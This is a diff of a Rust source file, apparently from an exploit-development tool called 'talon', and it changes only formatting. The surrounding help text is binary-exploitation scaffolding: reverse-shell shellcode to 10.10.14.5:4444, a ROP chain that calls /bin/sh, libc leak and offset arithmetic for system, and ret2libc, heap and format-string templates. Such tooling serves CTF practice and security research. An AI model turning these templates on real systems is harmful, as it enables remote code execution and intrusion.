@@ -1,9 +1,9 @@
-
 pub struct QuickMode;
 
 impl QuickMode {
     pub fn shell(host: &str, port: u16) -> String {
-        format!(r#"
+        format!(
+            r#"
 ╔══════════════════════════════════════════════════════════════════════════╗
 ║                    QUICK SHELL - Instant Reverse Shell                   ║
 ╚══════════════════════════════════════════════════════════════════════════╝
@@ -31,11 +31,14 @@ ARM:         shellcode("arm", "execve", "/bin/sh")
 REVERSE SHELL:
 ────────────────────────────────────────────────────────────────────────────
 let sc = shellcode("x64", "reverse", lhost: "10.10.14.5", lport: 4444)
-"#, host, port, host, port, host, port)
+"#,
+            host, port, host, port, host, port
+        )
     }
 
     pub fn rop(binary: &str) -> String {
-        format!(r#"
+        format!(
+            r#"
 ╔══════════════════════════════════════════════════════════════════════════╗
 ║                   QUICK ROP - Interactive ROP Builder                    ║
 ╚══════════════════════════════════════════════════════════════════════════╝
@@ -56,7 +59,7 @@ let ret = rop_find("{}", "ret")[0]["address"]
 STEP 3: BUILD ROP CHAIN
 ────────────────────────────────────────────────────────────────────────────
 let rop = [
-    ret,           
+    ret,
     pop_rdi,
     binsh_addr,
     pop_rsi,
@@ -74,12 +77,15 @@ QUICK TEMPLATES:
 ret2libc:     talon template ret2libc <host> <port>
 rop-chain:    talon template rop-chain <host> <port>
 stack-pivot:  talon template stack-pivot <host> <port>
-"#, binary, binary, binary, binary, binary)
+"#,
+            binary, binary, binary, binary, binary
+        )
     }
 
     #[allow(dead_code)]
     pub fn leak(conn_var: &str) -> String {
-        format!(r#"
+        format!(
+            r#"
 ╔══════════════════════════════════════════════════════════════════════════╗
 ║                   QUICK LEAK - Interactive Leak Helper                   ║
 ╚══════════════════════════════════════════════════════════════════════════╝
@@ -97,7 +103,7 @@ if len(matches) > 0 {{
     print("Found libc:", matches[0].id)
     let libc_base = addr - matches[0].symbols["puts"]
     print("libc base: 0x" + hex(libc_base))
-    
+
     let system = libc_base + matches[0].symbols["system"]
     let binsh = libc_base + matches[0].symbols["str_bin_sh"]
 }}
@@ -119,11 +125,14 @@ puts:        typically @ libc + 0x809c0
 printf:      typically @ libc + 0x64f70
 system:      typically @ libc + 0x4f440
 __libc_start_main: typically @ libc + 0x21ab0
-"#, conn_var, conn_var, conn_var, conn_var, conn_var, conn_var)
+"#,
+            conn_var, conn_var, conn_var, conn_var, conn_var, conn_var
+        )
     }
 
     pub fn pwn(binary: &str, host: &str, port: u16) -> String {
-        format!(r#"
+        format!(
+            r#"
 ╔══════════════════════════════════════════════════════════════════════════╗
 ║                 QUICK PWN - All-in-One Exploit Builder                   ║
 ╚══════════════════════════════════════════════════════════════════════════╝
@@ -170,7 +179,9 @@ SAVE TO FILE:
 ────────────────────────────────────────────────────────────────────────────
 Run: talon template ret2libc {} {} > exploit.talon
 Then: talon run exploit.talon
-"#, binary, host, port, host, port, binary, binary, binary, binary, binary, host, port)
+"#,
+            binary, host, port, host, port, binary, binary, binary, binary, binary, host, port
+        )
     }
 
     #[allow(dead_code)]
@@ -211,7 +222,8 @@ talon template tcache-poison <host> <port>
 talon template fastbin-dup <host> <port>
 talon template house-of-force <host> <port>
 talon template unsorted-bin-attack <host> <port>
-"#.to_string()
+"#
+        .to_string()
     }
 
     #[allow(dead_code)]
@@ -253,7 +265,8 @@ send(s, "/bin/sh\0")
 TEMPLATE:
 ────────────────────────────────────────────────────────────────────────────
 talon template format-string <host> <port>
-"#.to_string()
+"#
+        .to_string()
     }
 }
 
